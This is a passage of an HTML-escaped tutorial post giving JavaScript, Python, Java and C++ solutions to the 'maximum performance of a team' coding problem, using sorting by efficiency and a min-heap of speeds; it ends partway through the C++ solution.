&lt;p&gt;The Javascript code would be even faster with a custom &lt;strong&gt;heap&lt;/strong&gt; implementation. The &lt;strong&gt;MinPriorityQueue()&lt;/strong&gt; npm is easier to use, but not as efficient.&lt;/p&gt;

&lt;p&gt;Javascript is faster by passing only the index reference into the priority queue, rather than combining both stats into an array before storage.&lt;/p&gt;




&lt;h4&gt;
  &lt;a href="#javascript-code"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Javascript Code:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt;)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;maxPerformance&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;speed&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;efficiency&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;ord&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="na"&gt;length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nx"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;efficiency&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nx"&gt;efficiency&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;sppq&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;MinPriorityQueue&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
        &lt;span class="nx"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;best&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="nx"&gt;n&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;eng&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;sppq&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;enqueue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;speed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;eng&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sppq&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;size&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="nx"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nx"&gt;BigInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;speed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;eng&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="nx"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nx"&gt;BigInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;speed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;eng&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nx"&gt;sppq&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;dequeue&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;element&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;BigInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;efficiency&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;eng&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;best&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;best&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;best&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;&lt;span class="nx"&gt;n&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;h4&gt;
  &lt;a href="#python-code"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Python Code:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt;)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Solution&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;maxPerformance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;speed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;efficiency&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nb"&gt;ord&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;efficiency&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;speed&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;spheap&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;eff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;heappush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;spheap&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;spheap&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;heappop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;spheap&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;best&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;eff&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;h4&gt;
  &lt;a href="#java-code"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Java Code:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt;)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Solution&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;maxPerformance&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;speed&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;efficiency&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[][]&lt;/span&gt; &lt;span class="n"&gt;ord&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;];&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++)&lt;/span&gt;
            &lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="n"&gt;efficiency&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt; &lt;span class="n"&gt;speed&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;]};&lt;/span&gt;
        &lt;span class="nc"&gt;Arrays&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;sort&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nc"&gt;Integer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;compare&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]));&lt;/span&gt;
        &lt;span class="nc"&gt;PriorityQueue&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Integer&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;sppq&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nc"&gt;PriorityQueue&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
        &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;];&lt;/span&gt;
            &lt;span class="n"&gt;sppq&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;spd&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sppq&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;size&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;sppq&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;poll&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Math&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;max&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;best&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;h4&gt;
  &lt;a href="#c-code"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;C++ Code:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt;)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight cpp"&gt;&lt;code&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Solution&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nl"&gt;public:&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;maxPerformance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;vector&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;speed&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;vector&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;efficiency&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;vector&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;push_back&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="n"&gt;efficiency&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;speed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]});&lt;/span&gt;
        &lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rbegin&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rend&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
        &lt;span class="n"&gt;priority_queue&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;sppq&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;totalSpeed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;best&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;auto&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;spd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;second&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="n"&gt;sppq&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;spd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
